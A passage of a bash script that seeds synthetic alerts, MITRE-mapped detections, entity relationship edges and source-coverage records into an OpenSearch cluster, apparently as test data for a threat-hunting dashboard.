    BASE_DEST=$(( 2 + RANDOM % 10 ))
    CURR_DEST=$(( BASE_DEST + RISK_SCORE / 10 ))
    BASE_BYTES=$(( 50000 + RANDOM % 200000 ))
    CURR_BYTES=$(( BASE_BYTES + RISK_SCORE * 5000 ))
    BASE_SCAN=$(( RANDOM % 10 ))
    CURR_SCAN=$(( BASE_SCAN + RISK_SCORE / 5 ))

    METRICS_JSON="{\"baseline_metrics\":{\"connection_count\":{\"current\":${CURR_CONN},\"baseline\":${BASE_CONN},\"unit\":\"count\"},\"unique_destinations\":{\"current\":${CURR_DEST},\"baseline\":${BASE_DEST},\"unit\":\"count\"},\"bytes_transferred\":{\"current\":${CURR_BYTES},\"baseline\":${BASE_BYTES},\"unit\":\"bytes\"},\"port_scan_score\":{\"current\":${CURR_SCAN},\"baseline\":${BASE_SCAN},\"unit\":\"score\"}}}"
  else
    # Domain metrics: query_count, unique_resolvers, response_anomalies, ttl_variance
    BASE_QUERY=$(( 5 + RANDOM % 50 ))
    CURR_QUERY=$(( BASE_QUERY + RISK_SCORE * 3 ))
    BASE_RESOLV=$(( 1 + RANDOM % 5 ))
    CURR_RESOLV=$(( BASE_RESOLV + RISK_SCORE / 15 ))
    BASE_ANOMALY=$(( RANDOM % 3 ))
    CURR_ANOMALY=$(( BASE_ANOMALY + RISK_SCORE / 10 ))
    BASE_TTL=$(( RANDOM % 5 ))
    CURR_TTL=$(( BASE_TTL + RISK_SCORE / 20 ))

    METRICS_JSON="{\"baseline_metrics\":{\"query_count\":{\"current\":${CURR_QUERY},\"baseline\":${BASE_QUERY},\"unit\":\"count\"},\"unique_resolvers\":{\"current\":${CURR_RESOLV},\"baseline\":${BASE_RESOLV},\"unit\":\"count\"},\"response_anomalies\":{\"current\":${CURR_ANOMALY},\"baseline\":${BASE_ANOMALY},\"unit\":\"count\"},\"ttl_variance\":{\"current\":${CURR_TTL},\"baseline\":${BASE_TTL},\"unit\":\"score\"}}}"
  fi

  ${CURL_OS} -X POST "${OS_URL}/${ENTITY_IDX}/_update/${ENT_ID}" \
    -H "Content-Type: application/json" \
    -d "{\"doc\":${METRICS_JSON},\"doc_as_upsert\":true}" \
    2>/dev/null > /dev/null
  (( BASELINE_COUNT++ ))
done
ok "Baseline metrics added to ${BASELINE_COUNT} entities"

# =============================================================================
# STEP 6: Seed alerts for 40 key entities (2-15 alerts each) with MITRE mappings
# =============================================================================
header "Step 6: Seed alerts with MITRE technique mappings"

ALERT_BULK=$(mktemp /tmp/ha_dossier_alerts_XXXXXX.ndjson)
ALERT_TOTAL=0

for ENTITY_DEF in "${ENTITIES[@]}"; do
  IFS='|' read -r ENT_ID ENT_TYPE ENT_VALUE TENANT RISK_SCORE TREND <<< "$ENTITY_DEF"
  ALERT_IDX="v3-hive-alert-${TENANT}"
  TENANT_ID="$([ "$TENANT" == "cwm" ] && echo "1" || echo "2")"

  # Number of alerts: scale with risk score (2-15)
  NUM_ALERTS=$(( 2 + RISK_SCORE * 13 / 100 ))
  (( NUM_ALERTS > 15 )) && NUM_ALERTS=15

  for (( a=0; a<NUM_ALERTS; a++ )); do
    ALERT_ID="alert-${ENT_ID}-${a}"
    TS=$(random_ts_last_14d)

    # Pick MITRE technique
    MITRE_IDX=$(( (a + RANDOM) % ${#MITRE_TECHNIQUES[@]} ))
    IFS='|' read -r MITRE_ID MITRE_NAME MITRE_TACTIC <<< "${MITRE_TECHNIQUES[$MITRE_IDX]}"

    # Pick alert title and severity
    TITLE_IDX=$(( (a + RANDOM) % ${#ALERT_TITLES[@]} ))
    TITLE="${ALERT_TITLES[$TITLE_IDX]}"
    SEVERITY="${ALERT_SEVERITIES[$TITLE_IDX]}"

    # Build entity-specific fields
    HOST_NAME="$([ "$ENT_TYPE" == "host" ] && echo "$ENT_VALUE" || echo "ENG-SRV-001")"
    USER_NAME="$([ "$ENT_TYPE" == "user" ] && echo "$ENT_VALUE" || echo "${AUTH_USERS[$(( RANDOM % ${#AUTH_USERS[@]} ))]}")"
    SRC_IP="$([ "$ENT_TYPE" == "ip" ] && echo "$ENT_VALUE" || echo "${NETWORK_SRC_IPS[$(( RANDOM % ${#NETWORK_SRC_IPS[@]} ))]}")"
    DEST_IP="${NETWORK_DEST_IPS[$(( RANDOM % ${#NETWORK_DEST_IPS[@]} ))]}"

    printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$ALERT_IDX" "$ALERT_ID" >> "$ALERT_BULK"
    printf '{"@timestamp":"%s","id":"%s","title":"%s","severity":"%s","status":"open","rule.name":"Rule-%s","mitre.technique.id":"%s","mitre.technique.name":"%s","mitre.tactic.id":"%s","host.name":"%s","user.name":"%s","source.ip":"%s","destination.ip":"%s","event.dataset":"entity-dossier-seed","tenantId":%s}\n' \
      "$TS" "$ALERT_ID" "$TITLE" "$SEVERITY" \
      "$(echo "$MITRE_ID" | tr '.' '-')" \
      "$MITRE_ID" "$MITRE_NAME" "$MITRE_TACTIC" \
      "$HOST_NAME" "$USER_NAME" "$SRC_IP" "$DEST_IP" \
      "$TENANT_ID" >> "$ALERT_BULK"
    (( ALERT_TOTAL++ ))
  done
done

info "Generated ${ALERT_TOTAL} alerts, indexing via _bulk..."
${CURL_OS} -X POST "${OS_URL}/_bulk" \
  -H "Content-Type: application/x-ndjson" \
  --data-binary "@${ALERT_BULK}" 2>/dev/null > /dev/null
rm -f "$ALERT_BULK"
ok "Alerts indexed: ${ALERT_TOTAL} total (2-15 per entity)"

# =============================================================================
# STEP 7: Seed 300 relationship edges in v3-hive-relationship-*
# =============================================================================
header "Step 7: Seed 300 relationship edges with evidence"

REL_BULK=$(mktemp /tmp/ha_dossier_rels_XXXXXX.ndjson)
REL_COUNT=0

# Helper: generate evidence entries (1-4 per relationship)
generate_evidence() {
  local count=$1 rel_type=$2
  local evidence="["
  local ev_types=("network_event" "auth_event" "process_event" "alert")
  local ev_descs_network=("TCP connection established" "UDP packet exchange" "TLS handshake completed" "Data transfer observed")
  local ev_descs_auth=("Successful authentication" "Kerberos ticket granted" "NTLM auth exchange" "Session token issued")
  local ev_descs_process=("Process spawned remotely" "Service started" "Scheduled task executed" "Binary execution logged")
  local ev_descs_alert=("Alert triggered for activity" "Rule match detected" "Anomaly scored above threshold" "Correlation rule fired")

  for (( e=0; e<count; e++ )); do
    local ev_type_idx=$(( RANDOM % ${#ev_types[@]} ))
    local ev_type="${ev_types[$ev_type_idx]}"
    local ev_desc
    case "$ev_type" in
      network_event) ev_desc="${ev_descs_network[$(( RANDOM % ${#ev_descs_network[@]} ))]}" ;;
      auth_event) ev_desc="${ev_descs_auth[$(( RANDOM % ${#ev_descs_auth[@]} ))]}" ;;
      process_event) ev_desc="${ev_descs_process[$(( RANDOM % ${#ev_descs_process[@]} ))]}" ;;
      alert) ev_desc="${ev_descs_alert[$(( RANDOM % ${#ev_descs_alert[@]} ))]}" ;;
    esac
    local ev_ts=$(random_ts_last_14d)
    local ev_id="evt-$(( RANDOM ))$(( RANDOM ))"
    if (( e > 0 )); then evidence+=","; fi
    evidence+="{\"type\":\"${ev_type}\",\"description\":\"${ev_desc}\",\"timestamp\":\"${ev_ts}\",\"eventId\":\"${ev_id}\"}"
  done
  evidence+="]"
  echo "$evidence"
}

# Calculate strength from event count
calc_strength() {
  local event_count=$1
  if (( event_count <= 5 )); then
    echo "0.$(( 30 + RANDOM % 20 ))"
  elif (( event_count <= 20 )); then
    echo "0.$(( 50 + RANDOM % 20 ))"
  else
    echo "0.$(( 70 + RANDOM % 30 ))"
  fi
}

# ─── authenticated_to relationships (60) ────────────────────────────────────────
info "Generating authenticated_to relationships (60)..."
for (( r=0; r<60; r++ )); do
  # Users authenticate to hosts
  USER_IDX=$(( r % 15 ))  # cycle through 15 users
  HOST_IDX=$(( r % 14 ))  # cycle through 14 hosts (cwm)
  SRC_ENT="ent-user-${AUTH_USERS[$USER_IDX]//\./-}"
  # Map to actual entity IDs
  case $USER_IDX in
    0) SRC_ID="ent-user-admin-svc-01"; SRC_VAL="admin-svc-01"; SRC_TYPE="user" ;;
    1) SRC_ID="ent-user-admin-svc-02"; SRC_VAL="admin-svc-02"; SRC_TYPE="user" ;;
    2) SRC_ID="ent-user-sarah-chen"; SRC_VAL="sarah.chen"; SRC_TYPE="user" ;;
    3) SRC_ID="ent-user-admin-svc-04"; SRC_VAL="admin-svc-04"; SRC_TYPE="user" ;;
    4) SRC_ID="ent-user-priya-sharma"; SRC_VAL="priya.sharma"; SRC_TYPE="user" ;;
    5) SRC_ID="ent-user-alex-turner"; SRC_VAL="alex.turner"; SRC_TYPE="user" ;;
    6) SRC_ID="ent-user-svc-backup"; SRC_VAL="svc-backup"; SRC_TYPE="user" ;;
    7) SRC_ID="ent-user-sarah-johnson"; SRC_VAL="sarah.johnson"; SRC_TYPE="user" ;;
    8) SRC_ID="ent-user-james-wilson"; SRC_VAL="james.wilson"; SRC_TYPE="user" ;;
    9) SRC_ID="ent-user-marcus-bailey"; SRC_VAL="marcus.bailey"; SRC_TYPE="user" ;;
    10) SRC_ID="ent-user-admin-svc-05"; SRC_VAL="admin-svc-05"; SRC_TYPE="user" ;;
    11) SRC_ID="ent-user-carlos-rodriguez"; SRC_VAL="carlos.rodriguez"; SRC_TYPE="user" ;;
    12) SRC_ID="ent-user-kevin-wright"; SRC_VAL="kevin.wright"; SRC_TYPE="user" ;;
    13) SRC_ID="ent-user-tom-huang"; SRC_VAL="tom.huang"; SRC_TYPE="user" ;;
    14) SRC_ID="ent-user-david-nakamura"; SRC_VAL="david.nakamura"; SRC_TYPE="user" ;;
  esac
  # Target hosts
  declare -a TARGET_HOSTS=("ent-host-eng-srv-001" "ent-host-dc-001" "ent-host-fin-wks-001" "ent-host-dc-002" "ent-host-eng-srv-010" "ent-host-fin-wks-003" "ent-host-fin-wks-010" "ent-host-fin-wks-002" "ent-host-eng-srv-002" "ent-host-eng-srv-007" "ent-host-fin-wks-007" "ent-host-dc-003" "ent-host-eng-srv-015" "ent-host-fin-wks-013")
  declare -a TARGET_HOST_VALS=("ENG-SRV-001" "DC-001" "FIN-WKS-001" "DC-002" "ENG-SRV-010" "FIN-WKS-003" "FIN-WKS-010" "FIN-WKS-002" "ENG-SRV-002" "ENG-SRV-007" "FIN-WKS-007" "DC-003" "ENG-SRV-015" "FIN-WKS-013")

  TGT_ID="${TARGET_HOSTS[$HOST_IDX]}"
  TGT_VAL="${TARGET_HOST_VALS[$HOST_IDX]}"
  TGT_TYPE="host"

  EVENT_COUNT=$(( 1 + RANDOM % 30 ))
  STRENGTH=$(calc_strength $EVENT_COUNT)
  EVIDENCE_COUNT=$(( 1 + RANDOM % 4 ))
  EVIDENCE=$(generate_evidence $EVIDENCE_COUNT "authenticated_to")
  FIRST_SEEN=$(days_ago $(( 7 + RANDOM % 30 )))
  LAST_SEEN=$(hours_ago $(( RANDOM % 72 )))
  REL_ID="rel-auth-${r}"

  # Determine tenant based on target
  REL_TENANT="cwm"
  [[ "$TGT_ID" == *"015"* || "$TGT_ID" == *"013"* ]] && REL_TENANT="workmates1"
  REL_IDX="v3-hive-relationship-${REL_TENANT}"
  REL_TENANT_ID="$([ "$REL_TENANT" == "cwm" ] && echo "1" || echo "2")"

  printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$REL_IDX" "$REL_ID" >> "$REL_BULK"
  printf '{"id":"%s","sourceEntityId":"%s","targetEntityId":"%s","sourceEntityType":"%s","targetEntityType":"%s","sourceEntityValue":"%s","targetEntityValue":"%s","relationshipType":"authenticated_to","direction":"outbound","strength":%s,"evidence":%s,"firstSeen":"%s","lastSeen":"%s","eventCount":%d,"tenantId":%s}\n' \
    "$REL_ID" "$SRC_ID" "$TGT_ID" "$SRC_TYPE" "$TGT_TYPE" "$SRC_VAL" "$TGT_VAL" \
    "$STRENGTH" "$EVIDENCE" "$FIRST_SEEN" "$LAST_SEEN" "$EVENT_COUNT" "$REL_TENANT_ID" >> "$REL_BULK"
  (( REL_COUNT++ ))
done

# ─── communicated_with relationships (80) ────────────────────────────────────────
info "Generating communicated_with relationships (80)..."
declare -a ALL_IPS=("ent-ip-203-0-113-10" "ent-ip-198-51-100-5" "ent-ip-203-0-113-22" "ent-ip-203-0-113-45" "ent-ip-198-51-100-20" "ent-ip-10-1-10-15")
declare -a ALL_IP_VALS=("203.0.113.10" "198.51.100.5" "203.0.113.22" "203.0.113.45" "198.51.100.20" "10.1.10.15")

for (( r=0; r<80; r++ )); do
  # Hosts communicate with IPs
  HOST_IDX=$(( r % 14 ))
  IP_IDX=$(( r % 6 ))
  SRC_ID="${TARGET_HOSTS[$HOST_IDX]}"
  SRC_VAL="${TARGET_HOST_VALS[$HOST_IDX]}"
  SRC_TYPE="host"
  TGT_ID="${ALL_IPS[$IP_IDX]}"
  TGT_VAL="${ALL_IP_VALS[$IP_IDX]}"
  TGT_TYPE="ip"

  EVENT_COUNT=$(( 1 + RANDOM % 50 ))
  STRENGTH=$(calc_strength $EVENT_COUNT)
  EVIDENCE_COUNT=$(( 1 + RANDOM % 4 ))
  EVIDENCE=$(generate_evidence $EVIDENCE_COUNT "communicated_with")
  FIRST_SEEN=$(days_ago $(( 5 + RANDOM % 20 )))
  LAST_SEEN=$(hours_ago $(( RANDOM % 48 )))
  REL_ID="rel-comm-${r}"

  REL_TENANT="cwm"
  [[ "$SRC_ID" == *"015"* || "$SRC_ID" == *"013"* ]] && REL_TENANT="workmates1"
  REL_IDX="v3-hive-relationship-${REL_TENANT}"
  REL_TENANT_ID="$([ "$REL_TENANT" == "cwm" ] && echo "1" || echo "2")"

  printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$REL_IDX" "$REL_ID" >> "$REL_BULK"
  printf '{"id":"%s","sourceEntityId":"%s","targetEntityId":"%s","sourceEntityType":"%s","targetEntityType":"%s","sourceEntityValue":"%s","targetEntityValue":"%s","relationshipType":"communicated_with","direction":"outbound","strength":%s,"evidence":%s,"firstSeen":"%s","lastSeen":"%s","eventCount":%d,"tenantId":%s}\n' \
    "$REL_ID" "$SRC_ID" "$TGT_ID" "$SRC_TYPE" "$TGT_TYPE" "$SRC_VAL" "$TGT_VAL" \
    "$STRENGTH" "$EVIDENCE" "$FIRST_SEEN" "$LAST_SEEN" "$EVENT_COUNT" "$REL_TENANT_ID" >> "$REL_BULK"
  (( REL_COUNT++ ))
done

# ─── executed_on relationships (40) ──────────────────────────────────────────────
info "Generating executed_on relationships (40)..."
for (( r=0; r<40; r++ )); do
  # Users executed processes on hosts
  USER_IDX=$(( r % 15 ))
  HOST_IDX=$(( r % 14 ))
  case $USER_IDX in
    0) SRC_ID="ent-user-admin-svc-01"; SRC_VAL="admin-svc-01" ;;
    1) SRC_ID="ent-user-admin-svc-02"; SRC_VAL="admin-svc-02" ;;
    2) SRC_ID="ent-user-sarah-chen"; SRC_VAL="sarah.chen" ;;
    3) SRC_ID="ent-user-admin-svc-04"; SRC_VAL="admin-svc-04" ;;
    4) SRC_ID="ent-user-priya-sharma"; SRC_VAL="priya.sharma" ;;
    5) SRC_ID="ent-user-alex-turner"; SRC_VAL="alex.turner" ;;
    6) SRC_ID="ent-user-svc-backup"; SRC_VAL="svc-backup" ;;
    7) SRC_ID="ent-user-sarah-johnson"; SRC_VAL="sarah.johnson" ;;
    8) SRC_ID="ent-user-james-wilson"; SRC_VAL="james.wilson" ;;
    9) SRC_ID="ent-user-marcus-bailey"; SRC_VAL="marcus.bailey" ;;
    10) SRC_ID="ent-user-admin-svc-05"; SRC_VAL="admin-svc-05" ;;
    11) SRC_ID="ent-user-carlos-rodriguez"; SRC_VAL="carlos.rodriguez" ;;
    12) SRC_ID="ent-user-kevin-wright"; SRC_VAL="kevin.wright" ;;
    13) SRC_ID="ent-user-tom-huang"; SRC_VAL="tom.huang" ;;
    14) SRC_ID="ent-user-david-nakamura"; SRC_VAL="david.nakamura" ;;
  esac
  TGT_ID="${TARGET_HOSTS[$HOST_IDX]}"
  TGT_VAL="${TARGET_HOST_VALS[$HOST_IDX]}"

  EVENT_COUNT=$(( 1 + RANDOM % 25 ))
  STRENGTH=$(calc_strength $EVENT_COUNT)
  EVIDENCE_COUNT=$(( 1 + RANDOM % 4 ))
  EVIDENCE=$(generate_evidence $EVIDENCE_COUNT "executed_on")
  FIRST_SEEN=$(days_ago $(( 3 + RANDOM % 14 )))
  LAST_SEEN=$(hours_ago $(( RANDOM % 48 )))
  REL_ID="rel-exec-${r}"

  REL_TENANT="cwm"
  [[ "$TGT_ID" == *"015"* || "$TGT_ID" == *"013"* ]] && REL_TENANT="workmates1"
  REL_IDX="v3-hive-relationship-${REL_TENANT}"
  REL_TENANT_ID="$([ "$REL_TENANT" == "cwm" ] && echo "1" || echo "2")"

  printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$REL_IDX" "$REL_ID" >> "$REL_BULK"
  printf '{"id":"%s","sourceEntityId":"%s","targetEntityId":"%s","sourceEntityType":"user","targetEntityType":"host","sourceEntityValue":"%s","targetEntityValue":"%s","relationshipType":"executed_on","direction":"outbound","strength":%s,"evidence":%s,"firstSeen":"%s","lastSeen":"%s","eventCount":%d,"tenantId":%s}\n' \
    "$REL_ID" "$SRC_ID" "$TGT_ID" "$SRC_VAL" "$TGT_VAL" \
    "$STRENGTH" "$EVIDENCE" "$FIRST_SEEN" "$LAST_SEEN" "$EVENT_COUNT" "$REL_TENANT_ID" >> "$REL_BULK"
  (( REL_COUNT++ ))
done

# ─── accessed_from relationships (50) ────────────────────────────────────────────
info "Generating accessed_from relationships (50)..."
for (( r=0; r<50; r++ )); do
  # Hosts accessed from IPs
  HOST_IDX=$(( r % 14 ))
  IP_IDX=$(( r % 6 ))
  SRC_ID="${ALL_IPS[$IP_IDX]}"
  SRC_VAL="${ALL_IP_VALS[$IP_IDX]}"
  SRC_TYPE="ip"
  TGT_ID="${TARGET_HOSTS[$HOST_IDX]}"
  TGT_VAL="${TARGET_HOST_VALS[$HOST_IDX]}"
  TGT_TYPE="host"

  EVENT_COUNT=$(( 1 + RANDOM % 35 ))
  STRENGTH=$(calc_strength $EVENT_COUNT)
  EVIDENCE_COUNT=$(( 1 + RANDOM % 4 ))
  EVIDENCE=$(generate_evidence $EVIDENCE_COUNT "accessed_from")
  FIRST_SEEN=$(days_ago $(( 2 + RANDOM % 14 )))
  LAST_SEEN=$(hours_ago $(( RANDOM % 36 )))
  REL_ID="rel-access-${r}"

  REL_TENANT="cwm"
  [[ "$TGT_ID" == *"015"* || "$TGT_ID" == *"013"* ]] && REL_TENANT="workmates1"
  REL_IDX="v3-hive-relationship-${REL_TENANT}"
  REL_TENANT_ID="$([ "$REL_TENANT" == "cwm" ] && echo "1" || echo "2")"

  printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$REL_IDX" "$REL_ID" >> "$REL_BULK"
  printf '{"id":"%s","sourceEntityId":"%s","targetEntityId":"%s","sourceEntityType":"%s","targetEntityType":"%s","sourceEntityValue":"%s","targetEntityValue":"%s","relationshipType":"accessed_from","direction":"inbound","strength":%s,"evidence":%s,"firstSeen":"%s","lastSeen":"%s","eventCount":%d,"tenantId":%s}\n' \
    "$REL_ID" "$SRC_ID" "$TGT_ID" "$SRC_TYPE" "$TGT_TYPE" "$SRC_VAL" "$TGT_VAL" \
    "$STRENGTH" "$EVIDENCE" "$FIRST_SEEN" "$LAST_SEEN" "$EVENT_COUNT" "$REL_TENANT_ID" >> "$REL_BULK"
  (( REL_COUNT++ ))
done

# ─── transferred_data relationships (30) ─────────────────────────────────────────
info "Generating transferred_data relationships (30)..."
for (( r=0; r<30; r++ )); do
  # Hosts transferred data to IPs (exfil-like)
  HOST_IDX=$(( r % 14 ))
  IP_IDX=$(( r % 6 ))
  SRC_ID="${TARGET_HOSTS[$HOST_IDX]}"
  SRC_VAL="${TARGET_HOST_VALS[$HOST_IDX]}"
  TGT_ID="${ALL_IPS[$IP_IDX]}"
  TGT_VAL="${ALL_IP_VALS[$IP_IDX]}"

  EVENT_COUNT=$(( 1 + RANDOM % 20 ))
  STRENGTH=$(calc_strength $EVENT_COUNT)
  EVIDENCE_COUNT=$(( 1 + RANDOM % 4 ))
  EVIDENCE=$(generate_evidence $EVIDENCE_COUNT "transferred_data")
  FIRST_SEEN=$(days_ago $(( 1 + RANDOM % 10 )))
  LAST_SEEN=$(hours_ago $(( RANDOM % 24 )))
  REL_ID="rel-xfer-${r}"

  REL_TENANT="cwm"
  [[ "$SRC_ID" == *"015"* || "$SRC_ID" == *"013"* ]] && REL_TENANT="workmates1"
  REL_IDX="v3-hive-relationship-${REL_TENANT}"
  REL_TENANT_ID="$([ "$REL_TENANT" == "cwm" ] && echo "1" || echo "2")"

  printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$REL_IDX" "$REL_ID" >> "$REL_BULK"
  printf '{"id":"%s","sourceEntityId":"%s","targetEntityId":"%s","sourceEntityType":"host","targetEntityType":"ip","sourceEntityValue":"%s","targetEntityValue":"%s","relationshipType":"transferred_data","direction":"outbound","strength":%s,"evidence":%s,"firstSeen":"%s","lastSeen":"%s","eventCount":%d,"tenantId":%s}\n' \
    "$REL_ID" "$SRC_ID" "$TGT_ID" "$SRC_VAL" "$TGT_VAL" \
    "$STRENGTH" "$EVIDENCE" "$FIRST_SEEN" "$LAST_SEEN" "$EVENT_COUNT" "$REL_TENANT_ID" >> "$REL_BULK"
  (( REL_COUNT++ ))
done

# ─── part_of_group relationships (20) ────────────────────────────────────────────
info "Generating part_of_group relationships (20)..."
declare -a GROUPS=("domain-admins" "engineering-team" "finance-dept" "svc-accounts" "vpn-users")
for (( r=0; r<20; r++ )); do
  USER_IDX=$(( r % 15 ))
  case $USER_IDX in
    0) SRC_ID="ent-user-admin-svc-01"; SRC_VAL="admin-svc-01" ;;
    1) SRC_ID="ent-user-admin-svc-02"; SRC_VAL="admin-svc-02" ;;
    2) SRC_ID="ent-user-sarah-chen"; SRC_VAL="sarah.chen" ;;
    3) SRC_ID="ent-user-admin-svc-04"; SRC_VAL="admin-svc-04" ;;
    4) SRC_ID="ent-user-priya-sharma"; SRC_VAL="priya.sharma" ;;
    5) SRC_ID="ent-user-alex-turner"; SRC_VAL="alex.turner" ;;
    6) SRC_ID="ent-user-svc-backup"; SRC_VAL="svc-backup" ;;
    7) SRC_ID="ent-user-sarah-johnson"; SRC_VAL="sarah.johnson" ;;
    8) SRC_ID="ent-user-james-wilson"; SRC_VAL="james.wilson" ;;
    9) SRC_ID="ent-user-marcus-bailey"; SRC_VAL="marcus.bailey" ;;
    10) SRC_ID="ent-user-admin-svc-05"; SRC_VAL="admin-svc-05" ;;
    11) SRC_ID="ent-user-carlos-rodriguez"; SRC_VAL="carlos.rodriguez" ;;
    12) SRC_ID="ent-user-kevin-wright"; SRC_VAL="kevin.wright" ;;
    13) SRC_ID="ent-user-tom-huang"; SRC_VAL="tom.huang" ;;
    14) SRC_ID="ent-user-david-nakamura"; SRC_VAL="david.nakamura" ;;
  esac

  GROUP_NAME="${GROUPS[$(( r % ${#GROUPS[@]} ))]}"
  TGT_ID="group-${GROUP_NAME}"
  TGT_VAL="${GROUP_NAME}"

  EVENT_COUNT=$(( 1 + RANDOM % 5 ))
  STRENGTH=$(calc_strength $EVENT_COUNT)
  EVIDENCE_COUNT=$(( 1 + RANDOM % 2 ))
  EVIDENCE=$(generate_evidence $EVIDENCE_COUNT "part_of_group")
  FIRST_SEEN=$(days_ago $(( 30 + RANDOM % 60 )))
  LAST_SEEN=$(days_ago $(( RANDOM % 5 )))
  REL_ID="rel-group-${r}"
  REL_IDX="v3-hive-relationship-cwm"

  printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$REL_IDX" "$REL_ID" >> "$REL_BULK"
  printf '{"id":"%s","sourceEntityId":"%s","targetEntityId":"%s","sourceEntityType":"user","targetEntityType":"group","sourceEntityValue":"%s","targetEntityValue":"%s","relationshipType":"part_of_group","direction":"outbound","strength":%s,"evidence":%s,"firstSeen":"%s","lastSeen":"%s","eventCount":%d,"tenantId":1}\n' \
    "$REL_ID" "$SRC_ID" "$TGT_ID" "$SRC_VAL" "$TGT_VAL" \
    "$STRENGTH" "$EVIDENCE" "$FIRST_SEEN" "$LAST_SEEN" "$EVENT_COUNT" >> "$REL_BULK"
  (( REL_COUNT++ ))
done

# ─── same_subnet relationships (20) ──────────────────────────────────────────────
info "Generating same_subnet relationships (20)..."
for (( r=0; r<20; r++ )); do
  # Hosts on same subnet
  HOST_IDX1=$(( r % 14 ))
  HOST_IDX2=$(( (r + 7) % 14 ))
  # Avoid self-referencing
  [[ $HOST_IDX1 -eq $HOST_IDX2 ]] && HOST_IDX2=$(( (HOST_IDX2 + 1) % 14 ))

  SRC_ID="${TARGET_HOSTS[$HOST_IDX1]}"
  SRC_VAL="${TARGET_HOST_VALS[$HOST_IDX1]}"
  TGT_ID="${TARGET_HOSTS[$HOST_IDX2]}"
  TGT_VAL="${TARGET_HOST_VALS[$HOST_IDX2]}"

  EVENT_COUNT=$(( 5 + RANDOM % 50 ))
  STRENGTH=$(calc_strength $EVENT_COUNT)
  EVIDENCE_COUNT=$(( 1 + RANDOM % 3 ))
  EVIDENCE=$(generate_evidence $EVIDENCE_COUNT "same_subnet")
  FIRST_SEEN=$(days_ago $(( 30 + RANDOM % 90 )))
  LAST_SEEN=$(hours_ago $(( RANDOM % 24 )))
  REL_ID="rel-subnet-${r}"

  REL_TENANT="cwm"
  [[ "$SRC_ID" == *"015"* || "$SRC_ID" == *"013"* ]] && REL_TENANT="workmates1"
  REL_IDX="v3-hive-relationship-${REL_TENANT}"
  REL_TENANT_ID="$([ "$REL_TENANT" == "cwm" ] && echo "1" || echo "2")"

  printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$REL_IDX" "$REL_ID" >> "$REL_BULK"
  printf '{"id":"%s","sourceEntityId":"%s","targetEntityId":"%s","sourceEntityType":"host","targetEntityType":"host","sourceEntityValue":"%s","targetEntityValue":"%s","relationshipType":"same_subnet","direction":"bidirectional","strength":%s,"evidence":%s,"firstSeen":"%s","lastSeen":"%s","eventCount":%d,"tenantId":%s}\n' \
    "$REL_ID" "$SRC_ID" "$TGT_ID" "$SRC_VAL" "$TGT_VAL" \
    "$STRENGTH" "$EVIDENCE" "$FIRST_SEEN" "$LAST_SEEN" "$EVENT_COUNT" "$REL_TENANT_ID" >> "$REL_BULK"
  (( REL_COUNT++ ))
done

info "Generated ${REL_COUNT} relationship edges, indexing via _bulk..."
# Split into chunks if needed
LINES=$(wc -l < "$REL_BULK")
if (( LINES > 2000 )); then
  split -l 2000 "$REL_BULK" /tmp/ha_dossier_rel_chunk_
  for CHUNK in /tmp/ha_dossier_rel_chunk_*; do
    RESPONSE=$(${CURL_OS} -X POST "${OS_URL}/_bulk" \
      -H "Content-Type: application/x-ndjson" \
      --data-binary "@${CHUNK}" 2>/dev/null)
    if echo "$RESPONSE" | grep -q '"errors":true'; then
      warn "Some bulk indexing errors in relationships (non-fatal)"
    fi
    rm -f "$CHUNK"
  done
else
  RESPONSE=$(${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "Content-Type: application/x-ndjson" \
    --data-binary "@${REL_BULK}" 2>/dev/null)
  if echo "$RESPONSE" | grep -q '"errors":true'; then
    warn "Some bulk indexing errors in relationships (non-fatal)"
  fi
fi
rm -f "$REL_BULK"
ok "Relationships indexed: ${REL_COUNT} total (target: 300)"

# =============================================================================
# STEP 8: Update entity documents with source coverage
# =============================================================================
header "Step 8: Add source coverage to 40 key entities"

COVERAGE_COUNT=0
for ENTITY_DEF in "${ENTITIES[@]}"; do
  IFS='|' read -r ENT_ID ENT_TYPE ENT_VALUE TENANT RISK_SCORE TREND <<< "$ENTITY_DEF"
  ENTITY_IDX="v3-hive-entity-${TENANT}"

  # Source coverage depends on entity type:
  # endpoint_agent: all hosts
  # network_sensor: hosts + IPs
  # identity_provider: users + hosts
  # cloud_audit: domains + some users
  case "$ENT_TYPE" in
    host)
      SOURCES='[{"name":"endpoint_agent","type":"edr","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 4 )))"'","eventCount":'"$(( 200 + RANDOM % 800 ))"'},{"name":"network_sensor","type":"ids","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 6 )))"'","eventCount":'"$(( 100 + RANDOM % 500 ))"'},{"name":"identity_provider","type":"iam","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 12 )))"'","eventCount":'"$(( 50 + RANDOM % 200 ))"'}]'
      GAPS='[]'
      ;;
    user)
      SOURCES='[{"name":"identity_provider","type":"iam","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 8 )))"'","eventCount":'"$(( 100 + RANDOM % 400 ))"'},{"name":"cloud_audit","type":"saas","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 24 )))"'","eventCount":'"$(( 30 + RANDOM % 150 ))"'}]'
      # Some users have gaps in endpoint coverage
      if (( RANDOM % 3 == 0 )); then
        GAPS='[{"source":"endpoint_agent","lastSeen":"'"$(days_ago $(( 3 + RANDOM % 5 )))"'","expectedInterval":"1h","severity":"medium"}]'
      else
        GAPS='[]'
      fi
      ;;
    ip)
      SOURCES='[{"name":"network_sensor","type":"ids","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 2 )))"'","eventCount":'"$(( 300 + RANDOM % 1000 ))"'}]'
      GAPS='[{"source":"endpoint_agent","lastSeen":null,"expectedInterval":"1h","severity":"low"}]'
      ;;
    domain)
      SOURCES='[{"name":"network_sensor","type":"dns","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 6 )))"'","eventCount":'"$(( 50 + RANDOM % 300 ))"'},{"name":"cloud_audit","type":"proxy","status":"active","lastEvent":"'"$(hours_ago $(( RANDOM % 12 )))"'","eventCount":'"$(( 20 + RANDOM % 100 ))"'}]'
